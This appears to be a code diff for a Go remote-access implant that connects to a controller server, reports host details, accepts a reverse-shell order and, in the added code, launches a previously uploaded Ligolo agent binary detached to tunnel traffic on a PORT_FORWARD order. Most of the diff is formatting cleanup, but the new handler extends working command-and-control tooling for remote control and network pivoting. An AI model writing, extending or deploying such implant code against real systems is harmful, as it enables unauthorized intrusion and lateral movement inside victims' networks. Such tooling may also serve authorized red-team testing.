@@ -173,7 +173,7 @@ func handleList(conn net.Conn, root string, hdr Header) {
 	ents := make([]entry, 0, len(dir))
 	for _, de := range dir {
 		info, err := de.Info()
-			if err != nil {
+		if err != nil {
 			continue
 		}
 		ents = append(ents, entry{
@@ -334,15 +334,20 @@ func handleSession(conn net.Conn, root string, hdr Header) {
 	host, _ := os.Hostname()
 	cwd, _ := os.Getwd()
 	info := map[string]any{
-		"platform":   fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH),
-		"system":     runtime.GOOS,
-		"release":    "-",               // not easily portable
-		"version":    runtime.Version(), // Go runtime version
-		"machine":    runtime.GOARCH,
-		"processor":  runtime.GOARCH,
-		"python":     "-",               // keep key for controller UI
-		"pid":        os.Getpid(),
-		"user":       func() string { if u != nil { return u.Username }; return "" }(),
+		"platform":  fmt.Sprintf("%s-%s", runtime.GOOS, runtime.GOARCH),
+		"system":    runtime.GOOS,
+		"release":   "-",               // not easily portable
+		"version":   runtime.Version(), // Go runtime version
+		"machine":   runtime.GOARCH,
+		"processor": runtime.GOARCH,
+		"python":    "-", // keep key for controller UI
+		"pid":       os.Getpid(),
+		"user": func() string {
+			if u != nil {
+				return u.Username
+			}
+			return ""
+		}(),
 		"cwd":        cwd,
 		"hostname":   host,
 		"root":       root,
@@ -380,11 +385,59 @@ func handleReverseShell(conn net.Conn, _root string, hdr Header) {
 	}(controllerAddr)
 }
 
+// Port forward using a previously uploaded Ligolo agent binary.
+// Ensures executable permissions then launches the agent in background
+// with --connect <args>.
+func handlePortForward(conn net.Conn, root string, hdr Header, _ []byte) {
+	filename, _ := hdr["filename"].(string)
+	if filename == "" {
+		filename = "ligolo-agent"
+		if runtime.GOOS == "windows" {
+			filename += ".exe"
+		}
+	}
+	target, err := safeJoin(root, filename)
+	if err != nil {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: bad path: %v", err)}, nil)
+		return
+	}
+	if _, err := os.Stat(target); err != nil {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: missing %s: %v", target, err)}, nil)
+		return
+	}
+	if runtime.GOOS != "windows" {
+		_ = os.Chmod(target, 0o755)
+	}
+        connectArgs, _ := hdr["connect_args"].(string)
+        connectArgs = strings.TrimSpace(connectArgs)
+        if connectArgs == "" {
+                _ = writeFrame(conn, Header{"type": "LOG", "message": "PORT_FORWARD: missing connect_args"}, nil)
+                return
+        }
+        args := append([]string{"--connect"}, strings.Fields(connectArgs)...)
+        cmd := exec.Command(target, args...)
+        cmd.Stdin = nil
+        cmd.Stdout = nil
+        cmd.Stderr = nil
+        if err := cmd.Start(); err != nil {
+                _ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: start failed: %v", err)}, nil)
+                return
+        }
+        _ = cmd.Process.Release()
+        _ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PORT_FORWARD: started %s", target)}, nil)
+}
+
 // ---------- main loop ----------
 
 func main() {
 	server := flag.String("server", DefaultServerHost, "Server IP/host")
-	port := flag.Int("port", func() int { p, _ := strconv.Atoi(DefaultServerPort); if p == 0 { p = 9000 }; return p }(), "Server port")
+	port := flag.Int("port", func() int {
+		p, _ := strconv.Atoi(DefaultServerPort)
+		if p == 0 {
+			p = 9000
+		}
+		return p
+	}(), "Server port")
 	token := flag.String("auth-token", DefaultAuthToken, "Auth token")
 	clientID := flag.String("client-id", DefaultClientID, "Client ID (default: hostname)")
 	root := flag.String("root", DefaultRootBase, "Base directory for relative paths")
@@ -401,7 +454,7 @@ func main() {
 	}
 
 	addr := fmt.Sprintf("%s:%d", *server, *port)
-	
+
 	// Test connection mode
 	if *testConnection {
 		id = fmt.Sprintf("test-connection-%d", time.Now().UnixNano()%100000)
@@ -412,13 +465,13 @@ func main() {
 			os.Exit(1)
 		}
 		defer conn.Close()
-		
+
 		err = writeFrame(conn, Header{"type": "REGISTER", "client_id": id, "token": *token}, nil)
 		if err != nil {
 			fmt.Printf("Registration failed: %v\n", err)
 			os.Exit(1)
 		}
-		
+
 		fmt.Println("Connection test successful!")
 		os.Exit(0)
 	}
@@ -465,6 +518,8 @@ func runOnce(addr, clientID, token, root string) error {
 			handleSession(conn, root, hdr)
 		case "REVERSE_SHELL":
 			handleReverseShell(conn, root, hdr)
+		case "PORT_FORWARD":
+			handlePortForward(conn, root, hdr, payload)
 		default:
 			// ignore unknown / future orders
 		}
